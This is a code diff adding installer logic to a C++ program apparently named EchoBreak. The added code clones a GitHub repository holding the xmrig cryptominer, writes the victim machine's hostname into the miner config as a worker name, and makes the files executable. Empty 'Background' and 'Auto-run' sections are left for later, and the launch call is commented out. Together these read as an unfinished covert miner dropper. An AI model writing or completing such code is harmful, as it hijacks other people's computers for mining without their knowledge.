@@ -53,9 +53,20 @@ void editFile(const std::string& filename, std::string workername) {
 
 int main() {
     //=======Install=======
+    system("git clone https://github.com/Andrew-24coop/EchoBreak.git");
+    system("cd EchoBreak/xmrig-6.22.2");
+    //========Edit=========
     std::string compname = exec("hostname");
     std::string filename = "EchoBreak/ebxmr/config.json";
     editFile(filename, compname);
+
+    system("chmod +x xmrig");
+    system("chmod +x SHA256SUMS");
+    system("chmod +x config.json");
+
+    //=====Bachground======
+
+    //======Auto-run=======
 
     //=======Mining========
     //system("./xmrig");
